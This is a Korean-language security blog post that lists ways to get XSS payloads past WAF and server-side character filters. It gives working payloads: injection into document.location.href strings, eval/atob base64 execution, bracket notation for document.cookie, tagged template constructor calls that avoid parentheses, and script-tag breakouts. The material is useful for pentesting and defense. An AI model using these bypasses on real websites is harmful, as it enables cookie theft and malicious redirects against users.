---
title: "XSS Bypass WAF & Filtering 기법"
description: "모의해킹 및 버그바운티 시 XSS 취약점 분석에서 얻은 WAF 우회 및 필터링 우회 기법"
date: 2019-10-15
tags: ["web-security", "xss", "bypass", "waf"]
category: "Security Research"
published: true
---

**[Summary]**


본 글은 각종 모의해킹 및 버그바운티 시 XSS 취약점을 분석하며 얻은 경험을 토대로 작성한 글입니다.


서버 소스코드단의 필터링 및 네트워크단의 WAF 필터링 등을 우회하여 XSS Exploit을 성공시키기 위한 기법들을 일부 정리하였습니다.


**[Example 1]**


**조건 1**


https://ar9ang3.com/?param1=abc로 요청했을 시(지금은 GET으로 보냈지만 POST일 경우에도)


**조건 2**


서버단에 요청한 URI가 직접 javascript단으로 삽입될 경우


<script>


document.location.href = 'https://ar9ang3.tistory.com/?param1=abc';


</script>


**제약조건 3**


%3b(;), %2b(+)가 WAF단에서 필터링되어 document.location.href= 등을 벗어나지 못할 경우


**우회 및 XSS 트리거 코드 1 (Reflected XSS)**


문자열 - Native Function - 문자열 을 수행할 시 문자열의 결과를 연산하는 과정에서 Native Function이 실행되게 됩니다. 때문에 document.location="abc"-alert(document.cookie)-"def"; 와 같은 구문이 있을 시 document.location의 결과와는 상관 없이 alert(document.cookie) 구문이 실행되게 됩니다.


**{example}**


?param1=abc'-alert(document.cookie)-'def


<script>


document.location.href = 'https://ar9ang3.tistory.com/?param1=abc'-alert(document.cookie)-'def';


</script>


**우회 및 XSS 트리거 코드 2 (Redirect to other Site)**


위의 트리거 코드 1과 비슷하지만 && 연산자를 이용한다는 점이 다릅니다.


?param1=abc'&&'https://ar9ang3.com/


<script>


document.location.href = 'https://ar9ang3.tistory.com/?param1=abc'&&'https://ar9ang3.com/';


</script>


이와 같이 우회가 가능하다.


우회코드 1번의 경우 document.location.href 뒤의 문자열이 문자열 - alert(1)의 결과값 - 문자열이 되고, 문자열 - 문자열(상수)는 NaN이 됨으로 host의 /NaN으로 요청하게 된다. 하지만 이 중간에 alert에 해당하는 곳에 코드가 실행되게 된다.


우회코드 2번의 경우 문자열 && 문자열 을 할 시 뒤의 문자열이 최종적으로 적용되기 때문에 최종적으론 뒤에 적어놓은 문장으로 document.location.href가 동작하게 됨으로 내가 원하는 페이지로 redirect 시킬 수 있다.


**WAF Bypass Tips**


**. 을 필터링 할 시**


document.cookie => document['cookie']


**(" ")를 필터링 할 시**


eval("alert(1)") => eval[alert(1)]


**;나 +를 필터링 할 시**


'abc'-alert(1)-'def' => 함수 실행 후 정상 문자열을 대입하여야 할 때 => 'abc'-alert(1)^1&&'normal_string_here'


종합해보면


'abc'-eval[alert(document['cookie'])]^1&&'normal_string_here'


document.location.href 의 문자열에 대입해보면


document.location.href = 'abcdef?param1=**haha'-eval[alert(document['cookie'])]^1&&'https://ar9ang3.com/**';


**More Filtering Bypass tips**


임의의 자바스크립트 구문을 삽입할 수 있다고 가정하였을 때 우리는 두 가지를 생각하여야 합니다.


**1. 삽입된 자바스크립트 구문으로 인하여 '자바스크립트 문법 에러'가 유발되지 않는지**


**2. 삽입하는 자바스크립트 구문이 필터링되지 않는 지**


**<< 1. 삽입된 자바스크립트 구문으로 인하여 '자바스크립트 문법 에러'가 유발되지 않는지>>**


1번의 경우엔 jsbeautifier, sublimetext와 같은 beautify 혹은 ide툴을 통해 문법에러를 찾아내고(괄호 에러 등), 에러가 나서 자바스크립트 구문이 정상적으로 실행되지 않는다면 크롬의 개발자도구 콘솔창에 나타나는 자바스크립트 에러메세지를 확인하여 문법 에러를 찾아 낼 수 있습니다. 예를들어보면 아래와 같습니다.

```js
 try {
    if ('injection'==<%=request.getParameter("param")%>) {
        var a = "%inject here%";
    }
    var f = function(x) {
        var z = {
            a : 1,
            b : 2,
            c : 3
        };
        return a;
    }
} catch (e) { 
    console.log("err");
}
```


위와같은 구문에서 inject here에 우리가 원하는 임의의 자바스크립트 구문을 넣을 수 있다고 해봅시다. try 구문 안에있는 if 구문 안에 var a를 선언하는 과정에서 injection이 발생하였습니다. 우리가 원하는 스크립트를 실행시키기 위해선 if 조건과 상관없이 동작하도록 자바스크립트 코드를 재구성하여야 합니다.


**[Method 1]**


![image](/images/posts/xss-bypass-waf-filtering_15359c2b.png)


첫번째 방법은 문법을 맞춰주는것입니다. 구문에 맞게 모두 삽입하면 정상적으로 자바스크립트 코드가 실행되는것을 볼 수 있습니다.


**[Method 2]**


두번째 방법은 아래와 같습니다.
```js
 try {
    if ('injection'==<%=request.getParameter("param")%>) {
        var a = "blahblah";
    }
} catch(e) { }
alert(document.cookie);
</script>
<noscript>";
    }
    var f = function(x) {
        var z = {
            a : 1,
            b : 2,
            c : 3
        };
        return a;
    }
} catch (e) { 
    console.log("err");
}
```
</script>와 <noscript>를 삽입할 수 있을 시 위와같은 구문으로 대충 닫는것만 맞춰주고 스크립트를 실행시킨 후 스크립트 태그를 닫아버리고 noscript를 동작시키는것입니다.


위에 소개된 방법 외에도 xss가 터지는 상황은 워낙에 다양하기 때문에 그 상황상황에 맞춰 Exploit을 하여야 합니다. 만약 우리가 입력한 파라미터가 html 스크립트 내에 두곳으로 들어가게 되고, 이로인해 에러가 유발된다면 `(Back Quote)를 이용하여 두 삽입지점 사이의 모든 코드를 문자열로 만들거나 /* */와 같은 주석 코드를 이용하여 두 삽입지점 사이의 모든 문자를 무효화 할 수도 있습니다. 이와같이 다양한 방법으로 자바스크립트 문법 에러를 회피할 수 있습니다.


**<<2. 삽입하는 자바스크립트 구문이 필터링되지 않는 지>>**


필터링되는 문자열은 다양합니다. <, >, ', ", (, ), `, ;, %, &, +


위와같은 Character가 필터링 되어있을 시 우회하는 방법에 대해 일부 소개하고자 합니다.


**Example Code**


-> alert(document.cookie);


**alert와 같은 native function 자체를 필터링 할 시**


var a=alert; a(document.cookie);


**document.cookie 등을 필터링 할 시**


var a='alert'; var b='(documen'; var c='t.cooki'; var d='e)'; var e=eval; e(a+b+c+d);


**무언가 문자열을 필터링할 때**


var a=eval; a(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="));


BASE64로 인코딩 후 실행


**' / "를 필터링 할 시**


?param_a=\&param_b=;alert(document.cookie);var%20z='


var a='**\**'; var b='**;alert(document.cookie);var z='**';


**( ) 괄호를 필터링 할 시**


`` alert`123`; ``


**btoa.constructor`alert\x28document.cookie\x29```**


> 이에대해 조금 더 설명하자면, `` ` ``(back quote)는 살짝 특별한 Character이다. 문자열을 만들때도 사용할 수 있으며, 함수를 실행할 때 인자를 `` alert`123`; `` 처럼 줄 수도 있다. 때문에 이에 대해 조금더 언급하면, btoa와 같은 Native function의 constructor method를 이용하여 인자로**문자열로 된 스크립트 구문**을 전달하면 btoa의 constructor function으로 스크립트가 지정된다. 이후 `` ` ``(back quote)를 두번 써줌으로써 btoa를 실행시키게 되고, 이로인해 앞에서 저장한 스크립트 구문이 실행되게 된다. 또한 자바스크립트에선 \x28과 같은 Ascii hex를 자동으로 converting 해주기 때문에 \x28, \u28, \u0028과 같은 구문들이 문자열 내에서 자동으로 ascii charcter로 변환되게 된다. 때문에 최종적으로 alert(document.cookie) 구문이 실행되게 된다.


---


여러가지 상황에서 XSS를 성공시키는 법에 대해 알아보았는데, 솔직히 XSS의 경우 Mitigation 구현도 다양하고 삽입되는 위치와 상황도 모두 다 다양합니다. 때문에 천편일률적인 우회 기법이 아니라 그때그때 상황에 맞추어 우회하는것이 중요하다고 생각합니다. 최근 한글 XSS, 가타카나 XSS등과 같은 내용들도 보았는데, 이처럼 새로운 방법들이 계속해서 나오고 있습니다. 이러한 내용들까지 모두 언급하지는 않고 이정도로만 작성하고 마치도록 하겠습니다.